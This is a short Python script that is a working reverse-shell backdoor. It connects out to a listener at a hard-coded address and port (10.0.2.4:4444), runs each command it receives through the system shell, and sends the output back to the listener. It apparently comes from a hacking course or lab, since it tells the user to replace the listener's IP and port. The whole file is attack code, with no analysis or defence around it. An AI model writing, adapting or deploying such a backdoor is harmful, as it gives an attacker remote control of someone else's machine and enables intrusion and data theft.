import socket
import subprocess
import json


class Client:
    def __init__(self, host, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((host, port))  # Connect to the listener

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))  # Encode to bytes

    def reliable_receive(self):
        json_data = b""  # Initialize as bytes
        while True:
            try:
                chunk = self.connection.recv(1024)
                if not chunk:
                    break  # Break if the connection is closed
                json_data += chunk
                return json.loads(json_data.decode("utf-8"))  # Decode for JSON parsing
            except json.JSONDecodeError:
                continue

    def execute_commands(self):
        while True:
            command = self.reliable_receive()  # Receive command from listener
            if command == 'exit':
                break  # Exit if 'exit' command received
            # Execute the command and capture the output
            output = subprocess.run(command, shell=True, capture_output=True)
            self.reliable_send(output.stdout.decode() + output.stderr.decode())  # Send back the output

        self.connection.close()  # Close the connection

# Replace with your listener's IP and port
my_client = Client("10.0.2.4", 4444)
my_client.execute_commands()

